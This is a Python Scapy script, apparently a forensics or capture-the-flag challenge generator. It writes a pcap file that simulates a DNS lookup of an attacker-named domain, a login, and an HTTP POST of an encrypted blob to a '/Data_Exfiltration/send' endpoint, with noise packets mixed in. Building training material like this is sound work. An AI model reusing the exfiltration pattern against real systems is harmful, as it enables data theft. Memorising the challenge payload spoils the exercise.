from scapy.all import *
import random
import time

# === Editable Variables ===
dns_server_ip = "8.8.8.8"  # Targeted DNS Server
subdomain = "IEEE.hacker.com"
alias_domain = "4x1.vercel.app"
resolved_ip = "216.198.79.1"  # IP of alias domain
http_host = subdomain
login_endpoint = "/login"
exfil_endpoint = "/Data_Exfiltration/send"
http_port = 80

# Generate a fake session ID
session_id = f"PHPSESSID={random.randint(100000, 999999)}"
encrypted_data1 = "SWVKe9yw1DxwRAdNZk1nZI5/cOginzlqqVLnjo1DhJKNFzZ2vMLHw4D2iT6fjzepxO4uuHzwpkF0%2byPeJRDbAzI9tr8/dmAZumFUw8MWdiSYybyoWL51wFL3DLLQXCtcbagyc4yBO7t9syqlQeRYvGubB4dh46tm5eS2jqCgXsCsfYfbFMFoap8v%2bocVr0ucsGM1B1ZckSjGIi%2bPHUrlMgghoLcOvYKo/fwsI5O8IeMAR1sZVcbBCjQLWeH/rzI5ATGaUh%2bZ1XAEXHuGkJ2L52g88tplptA897jTP40uBIG7LOmWGHBYJrcieVBX4EqqmTA5jhn8QTdawXx8/gFUJ5zkknb6g5ZgeiEAMpP0vt3Pfgx6oEfc1b9Dvdl6lcl76d8zijY1wpCDukup4pm777gGhfneDBZ/4pv9pEaTXgtqsEG4yCqOPMkfuoEqiiPo4CoOUyONsjSmbGxWeowz5%2bY02/DWy%2brxa0irv4gnQf1G1ybC1h0xQYscImbcxb7WSs1dfqVuvzZbTC2sV%2bH0fqwwoprAjoZYY36Vv10="

# Store packets for PCAP
packet_list = []

def random_delay():
    time.sleep(random.uniform(0.1, 0.5))

def add_noise_packets():
    for _ in range(random.randint(5, 15)):
        noise_pkt = IP(dst="192.168.1.1") / UDP(dport=random.randint(1000, 65535)) / Raw(load="noise_data")
        packet_list.append(noise_pkt)
        random_delay()

# === Simulated DNS Query ===
dns_query = IP(dst=dns_server_ip, ttl=random.randint(32, 128)) / UDP(dport=53, sport=RandShort()) / DNS(rd=1, qd=DNSQR(qname=subdomain))
dns_response = IP(dst="156.120.1.100", ttl=random.randint(32, 128)) / UDP(dport=53) / DNS(qr=1, aa=1, rd=1, 
                qd=DNSQR(qname=subdomain), 
                an=DNSRR(rrname=subdomain, type="CNAME", rdata=alias_domain) /
                   DNSRR(rrname=alias_domain, type="A", rdata=resolved_ip))

packet_list.append(dns_query)
random_delay()
packet_list.append(dns_response)
random_delay()

# === Simulated TCP Handshake ===
syn_packet = IP(dst=resolved_ip, ttl=random.randint(32, 128)) / TCP(dport=http_port, sport=RandShort(), seq=random.randint(1000, 9999), flags="S")
syn_ack = IP(dst="156.120.1.100") / TCP(dport=syn_packet[TCP].sport, sport=http_port, seq=random.randint(1000, 9999), ack=syn_packet[TCP].seq + 1, flags="SA")
ack_packet = IP(dst=resolved_ip) / TCP(dport=http_port, sport=syn_packet[TCP].sport, seq=syn_packet[TCP].seq + 1, ack=syn_ack[TCP].seq + 1, flags="A")

packet_list.extend([syn_packet, syn_ack, ack_packet])
random_delay()

# === Simulated HTTP POST Request ===
credentials = "username=user&password=pass"
http_post_request = f"POST {login_endpoint} HTTP/1.1\r\nHost: {http_host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(credentials)}\r\n\r\n{credentials}"
post_packet = IP(dst=resolved_ip) / TCP(dport=http_port, sport=syn_packet[TCP].sport, seq=syn_packet[TCP].seq + 2, ack=syn_ack[TCP].seq + 1, flags="PA") / Raw(load=http_post_request)
packet_list.append(post_packet)
random_delay()

# === Simulated HTTP Response ===
http_response = f"HTTP/1.1 200 OK\r\nSet-Cookie: {session_id}\r\n\r\nLogin Successfully"
response_packet = IP(dst="156.120.1.100") / TCP(dport=syn_packet[TCP].sport, sport=http_port, seq=syn_ack[TCP].seq + 2, ack=post_packet[TCP].seq + len(http_post_request), flags="PA") / Raw(load=http_response)
packet_list.append(response_packet)
random_delay()

# === Simulated Data Exfiltration ===
http_exfil_request = f"POST {exfil_endpoint} HTTP/1.1\r\nHost: {http_host}\r\nCookie: {session_id}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(encrypted_data1)}\r\n\r\n{encrypted_data1}"
exfil_packet = IP(dst=resolved_ip) / TCP(dport=http_port, sport=syn_packet[TCP].sport, seq=response_packet[TCP].seq + len(http_response), ack=response_packet[TCP].ack, flags="PA") / Raw(load=http_exfil_request)
packet_list.append(exfil_packet)
random_delay()

# Add noise packets before saving
add_noise_packets()

# Save Packets to PCAP
wrpcap("Flight_11.pcap", packet_list)
print("[+] Packets saved to 'Flight_11.pcap'")
